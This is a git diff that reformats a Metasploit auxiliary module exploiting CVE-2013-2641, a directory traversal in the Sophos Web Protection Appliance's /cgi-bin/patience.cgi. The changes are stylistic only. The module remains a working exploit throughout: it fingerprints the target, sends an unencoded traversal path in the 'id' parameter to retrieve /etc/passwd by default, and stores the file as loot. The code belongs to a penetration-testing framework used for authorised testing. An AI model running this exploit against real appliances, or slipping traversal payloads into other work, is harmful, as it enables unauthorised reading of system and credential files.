@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,59 +8,57 @@ require 'uri'
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Sophos Web Protection Appliance patience.cgi Directory Traversal',
-      'Description' => %q{
-        This module abuses a directory traversal in Sophos Web Protection Appliance, specifically
-        on the /cgi-bin/patience.cgi component. This module has been tested successfully on the
-        Sophos Web Virtual Appliance v3.7.0.
-      },
-      'Author'       =>
-        [
-          'Wolfgang Ettlingers', # Vulnerability discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'CVE', '2013-2641' ],
-          [ 'OSVDB', '91953' ],
-          [ 'BID', '58833' ],
-          [ 'EDB', '24932' ],
-          [ 'URL', 'http://www.sophos.com/en-us/support/knowledgebase/118969.aspx' ],
-          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt' ]
-        ],
-      'DefaultOptions' => {
-        'SSL' => true
-      },
-      'DisclosureDate' => 'Apr 03 2013'))
+                      'Name'        => 'Sophos Web Protection Appliance patience.cgi Directory Traversal',
+                      'Description' => %q(
+                        This module abuses a directory traversal in Sophos Web Protection Appliance, specifically
+                        on the /cgi-bin/patience.cgi component. This module has been tested successfully on the
+                        Sophos Web Virtual Appliance v3.7.0.
+                      ),
+                      'Author' =>
+                        [
+                          'Wolfgang Ettlingers', # Vulnerability discovery
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'License'     => MSF_LICENSE,
+                      'References'  =>
+                        [
+                          [ 'CVE', '2013-2641' ],
+                          [ 'OSVDB', '91953' ],
+                          [ 'BID', '58833' ],
+                          [ 'EDB', '24932' ],
+                          [ 'URL', 'http://www.sophos.com/en-us/support/knowledgebase/118969.aspx' ],
+                          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt' ]
+                        ],
+                      'DefaultOptions' => {
+                        'SSL' => true
+                      },
+                      'DisclosureDate' => 'Apr 03 2013'))
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/passwd']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 2])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def my_basename(filename)
-    return ::File.basename(filename.gsub(/\\/, "/"))
+    ::File.basename(filename.tr('\\', "/"))
   end
 
   def is_proficy?
-
     res = send_request_cgi(
-      {
-        'uri'       => "/cgi-bin/patience.cgi",
-        'method'    => 'GET'
-      })
+      'uri'       => "/cgi-bin/patience.cgi",
+      'method'    => 'GET'
+    )
 
-    if res and res.code == 307 and res.body =~ /The patience page request was not valid/
+    if res && (res.code == 307) && res.body =~ /The patience page request was not valid/
       return true
     else
       return false
@@ -75,23 +74,20 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Retrieving file contents...")
 
     res = send_request_cgi(
-      {
-        'uri'       => "/cgi-bin/patience.cgi",
-        'method'    => 'GET',
-        'encode_params' => false,
-        'vars_get' => {
-          'id'  => travs
-        }
-      })
+      'uri'       => "/cgi-bin/patience.cgi",
+      'method'    => 'GET',
+      'encode_params' => false,
+      'vars_get' => {
+        'id' => travs
+      }
+    )
 
-
-    if res and (res.code == 200 or res.code == 500) and res.headers['X-Sophos-PatienceID']
+    if res && ((res.code == 200) || (res.code == 500)) && res.headers['X-Sophos-PatienceID']
       return res.body
     else
       print_status("#{res.code}\n#{res.body}")
       return nil
     end
-
   end
 
   def run
@@ -111,14 +107,12 @@ class MetasploitModule < Msf::Auxiliary
 
     file_name = my_basename(datastore['FILEPATH'])
     path = store_loot(
-        'sophos.wpa.traversal',
-        'application/octet-stream',
-        rhost,
-        contents,
-        file_name
+      'sophos.wpa.traversal',
+      'application/octet-stream',
+      rhost,
+      contents,
+      file_name
     )
     print_good("File saved in: #{path}")
-
   end
-
 end
